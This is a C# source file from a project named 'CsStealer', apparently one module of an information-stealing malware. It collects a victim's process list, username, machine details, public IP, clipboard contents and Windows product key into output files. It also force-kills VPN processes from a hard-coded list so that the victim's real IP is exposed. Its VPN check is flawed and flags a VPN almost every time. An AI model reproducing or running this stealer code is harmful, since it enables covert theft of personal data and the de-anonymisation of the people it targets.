using System;
using System.Text;
using System.Management;
using System.Diagnostics;
using TextCopy;

namespace CsStealer
{
    class SystemUtils
    {
        public static void GetTasksList()
        {
            string HeadersText = $"{Credit.Header}[ WORKING ON : {Environment.MachineName} ]\n[ USER : {Environment.UserName} ]\n\n";

            File.WriteAllText(Path.Combine(Config.OutputDir, "System", "Tasklist.txt"), HeadersText);

            foreach (Process Proc in Process.GetProcesses())
            {
                string Line;

                if (Proc.ProcessName == Process.GetCurrentProcess().ProcessName)
                {
                    Line = $"{Proc.ProcessName} | {Proc.Id} ( STEALER PROCESS )\n";
                }
                else
                {
                    Line = $"{Proc.ProcessName} | {Proc.Id}\n";
                }

                File.AppendAllText(Path.Combine(Config.OutputDir, "System", "Tasklist.txt"), Line);
            }
        }

        public static async Task GetSystemInfos()
        {

            async Task<string> GetIpAddr()
            {
                string IpAddress;

                using (HttpClient client = new HttpClient())
                {
                    try
                    {
                        IpAddress = await client.GetStringAsync("https://api.ipify.org");
                    }
                    catch
                    {
                        IpAddress = "--";
                    }
                }

                return IpAddress;
            }

            void KillVPNs(List<string> ProcessList)
            {
                foreach (string ProcName in ProcessList)
                {
                    try
                    {
                        Process[] Processes = Process.GetProcessesByName(ProcName);

                        foreach (Process Proc in Processes)
                        {
                            try
                            {
                                Proc.Kill();
                                Debugger.Debug("INFO", $"Killed VPN process : {Proc.ProcessName}");
                            }
                            catch (Exception ex)
                            {
                                Debugger.Debug("ERROR", $"Couldn't kill the VPN process {Proc.ProcessName} : {ex.Message}");
                            }
                        }
                    }
                    catch
                    {

                    }
                }
            }

            static string? GetMachineUUID()
            {
                return "";
            }

            string IpAddress;
            bool HasVpn = false;
            string VpnIpAddress = "--";

            List<string> vpnProcesses = new List<string>
        {
            "openvpn",
            "openvpn-gui",
            "openvpnserv",
            "openvpn-service",

            "wireguard",
            "wg",
            "wg-quick",

            "nordvpn",
            "nordvpn-service",

            "expressvpn",
            "expressvpnservice",

            "protonvpn",
            "protonvpnservice",

            "surfshark",
            "surfshark-service",

            "cyberghost",
            "cyberghostvpn",
            "cyberghost-service",

            "windscribe",
            "windscribehelper",

            "pia-service",
            "pia-client",
            "piactl",

            "mullvad",
            "mullvad-daemon",
            "mullvad-gui",

            "atlasvpn",
            "atlasvpn-service",

            "hideme",
            "hideme-service",

            "hsswd",
            "hsscp",
            "hss_notifier"
        };

            try
            {
                IpAddress = await GetIpAddr();

                foreach (string ProcName in vpnProcesses)
                {
                    try
                    {
                        Process[] vpnProcessListByName = Process.GetProcessesByName(ProcName);
                        HasVpn = true;
                    }
                    catch
                    {
                    }
                }

                if (!HasVpn)
                {
                    Debugger.Debug("INFO", $"Successfully retrieved public IP ({IpAddress})");
                }
                else
                {
                    Debugger.Debug("INFO", "The client was using a VPN : killing VPNs and restarting IP Address recovery");

                    KillVPNs(vpnProcesses);

                    IpAddress = await GetIpAddr();

                    if (IpAddress == VpnIpAddress)
                    {
                        Debugger.Debug("ERROR", "Couldn't kill the VPN");
                        IpAddress = "Couldn't find the real public IP. Read Debug.log for more infos.";
                    }
                }
            }

            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"Error retrieving public IP : {ex.Message}");
                IpAddress = "Unavailable";
            }

            var sb = new StringBuilder();

            sb.AppendLine(Credit.Header);
            sb.AppendLine($"[ WORKING ON : {Environment.MachineName} ]");
            sb.AppendLine($"[ USER : {Environment.UserName} ]");
            sb.AppendLine();

            sb.AppendLine($"UserName : {Environment.UserName}");
            sb.AppendLine($"MachineName : {Environment.MachineName}");
            sb.AppendLine($"Operating System : {Environment.OSVersion}");
            sb.AppendLine($"IsElevated (approx) : {Environment.IsPrivilegedProcess}");

            if (!HasVpn)
            {
                sb.AppendLine($"Public IP : {IpAddress}");
            }
            else
            {
                sb.AppendLine($"Public VPN IP : {VpnIpAddress}");
                sb.AppendLine($"Public IP : {IpAddress}");

            }

            sb.AppendLine();

            try
            {
                using (var searcher = new ManagementObjectSearcher("select Name,NumberOfCores,NumberOfLogicalProcessors,MaxClockSpeed from Win32_Processor"))
                {
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        sb.AppendLine("CPU:");
                        sb.AppendLine($"  Name: {mo["Name"]}");
                        sb.AppendLine($"  Cores: {mo["NumberOfCores"]}");
                        sb.AppendLine($"  LogicalProcessors: {mo["NumberOfLogicalProcessors"]}");
                        sb.AppendLine($"  MaxClockSpeed (MHz): {mo["MaxClockSpeed"]}");
                        sb.AppendLine();
                    }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"CPU: unavailable ({ex.Message})");
            }

            try
            {
                using (var searcher = new ManagementObjectSearcher("select TotalPhysicalMemory from Win32_ComputerSystem"))
                {
                    ManagementObject mo = searcher.Get().Cast<ManagementObject>().FirstOrDefault();
                    if (mo != null)
                    {
                        if (ulong.TryParse(mo["TotalPhysicalMemory"]?.ToString() ?? "0", out ulong totalBytes))
                        {
                            sb.AppendLine($"RAM Total: {totalBytes / (1024 * 1024)} MB");
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"RAM: unavailable ({ex.Message})");
            }
            sb.AppendLine();

            try
            {
                using (var searcher = new ManagementObjectSearcher("select Name,AdapterRAM,DriverVersion from Win32_VideoController"))
                {
                    sb.AppendLine("GPUs:");
                    foreach (ManagementObject mo in searcher.Get())
                    {
                        string name = mo["Name"]?.ToString() ?? "Unknown";
                        string ramStr = "Unknown";
                        if (mo["AdapterRAM"] != null && UInt32.TryParse(mo["AdapterRAM"].ToString(), out uint adapterRam))
                            ramStr = (adapterRam / (1024 * 1024)).ToString() + " MB";
                        sb.AppendLine($"  - {name} | RAM: {ramStr} | Driver: {mo["DriverVersion"]}");
                    }
                    sb.AppendLine();
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"GPUs: unavailable ({ex.Message})");
            }

            try
            {
                sb.AppendLine("Disks:");
                foreach (var drive in DriveInfo.GetDrives().Where(d => d.IsReady))
                {
                    sb.AppendLine($"  {drive.Name} - {drive.DriveType} - Free: {drive.AvailableFreeSpace / (1024 * 1024 * 1024)} GB - Total: {drive.TotalSize / (1024 * 1024 * 1024)} GB - Format: {drive.DriveFormat}");
                }
                sb.AppendLine();
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Disks: unavailable ({ex.Message})");
            }

            try
            {
                var current = System.Diagnostics.Process.GetCurrentProcess();
                sb.AppendLine($"Current Process: {current.ProcessName} (PID {current.Id})");
                sb.AppendLine($"  Working Set: {current.WorkingSet64 / (1024 * 1024)} MB");
                sb.AppendLine($"  Start Time: {current.StartTime}");
                sb.AppendLine();
            }
            catch { }

            string filePath = Path.Combine(Config.OutputDir, "System", "System.txt");

            try
            {
                File.WriteAllText(filePath, sb.ToString());
                Debugger.Debug("INFO", $"System information written to {filePath}");
            }
            catch (Exception ex)
            {
                Debugger.Debug("ERROR", $"Failed to write System.txt: {ex.Message}");
            }
        }

        public static void GetClipboard()
        {
            string? ClipBoardContent = ClipboardService.GetText();

            if (string.IsNullOrEmpty(ClipBoardContent))
            {
                ClipBoardContent = "No clipboard";
            }

            File.WriteAllText(Path.Combine(Config.OutputDir, "System", "Clipboard.txt"), ClipBoardContent);
        }

        public static void GetWindowsProductKey()
        {
            string OutF = Path.Combine(Config.OutputDir, "System", "Windows Product Key.txt");

            Process WMIC = new Process();

            WMIC.StartInfo.FileName = "C:\\Windows\\System32\\wbem\\WMIC.exe";
            WMIC.StartInfo.Arguments = "path softwarelicensingservice get OA3xOriginalProductKey";
            WMIC.StartInfo.CreateNoWindow = true;

            WMIC.StartInfo.RedirectStandardOutput = true;

            WMIC.Start();

            string RawOutput = WMIC.StandardOutput.ReadToEnd();

            WMIC.WaitForExit();

            if (string.IsNullOrEmpty(RawOutput))
            {
                Debugger.Debug("INFO", "No Windows product key found");
                return;
            }

            string WindowsProductKey = RawOutput.Split("\n")[1].Trim();

            if (string.IsNullOrEmpty(WindowsProductKey))
            {
                Debugger.Debug("INFO", "No Windows product key found");
                return;
            }

            Debugger.Debug("INFO", "Product key found : " + WindowsProductKey);

            File.WriteAllText(OutF, $"[ WORKING ON {Environment.MachineName} ]\n\nWindows product key : {WindowsProductKey}");
        }
    }
}